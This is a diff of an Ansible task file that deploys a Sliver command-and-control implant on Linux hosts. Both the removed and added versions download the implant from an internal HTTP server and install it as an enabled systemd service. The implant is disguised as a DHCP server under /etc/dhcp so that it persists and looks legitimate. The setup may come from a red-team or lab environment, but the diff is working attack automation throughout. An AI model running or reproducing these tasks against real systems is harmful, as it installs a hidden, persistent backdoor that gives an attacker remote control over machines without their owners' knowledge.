@@ -1,26 +1,24 @@
 ---
-- name: deploy sliver
-  tasks:
-    - name: download sliver
-      get_url:
-        url: http://172.16.0.9:8000/linux_implant
-        dest: /tmp/dhcpserver
-        mode: 0755
-    
-    - name: make it a service 
-      copy:
-        src: /tmp/dhcpserver
-        dest: /etc/dhcp/dhcpserver
-        mode: 0755
+- name: download sliver
+  get_url:
+    url: http://172.16.0.9:8000/linux_implant
+    dest: /tmp/dhcpserver
+    mode: 0755
 
-    - name: create service file
-      copy:
-        src: linux_sliver.service
-        dest: /etc/systemd/system/dhcpserver.service
-        mode: 0644
-    
-    - name: start service
-      systemd:
-        name: dhcpserver
-        state: started
-        enabled: yes
+- name: make it a service 
+  copy:
+    src: /tmp/dhcpserver
+    dest: /etc/dhcp/dhcpserver
+    mode: 0755
+
+- name: create service file
+  copy:
+    src: linux_sliver.service
+    dest: /etc/systemd/system/dhcpserver.service
+    mode: 0644
+
+- name: start service
+  systemd:
+    name: dhcpserver
+    state: started
+    enabled: yes
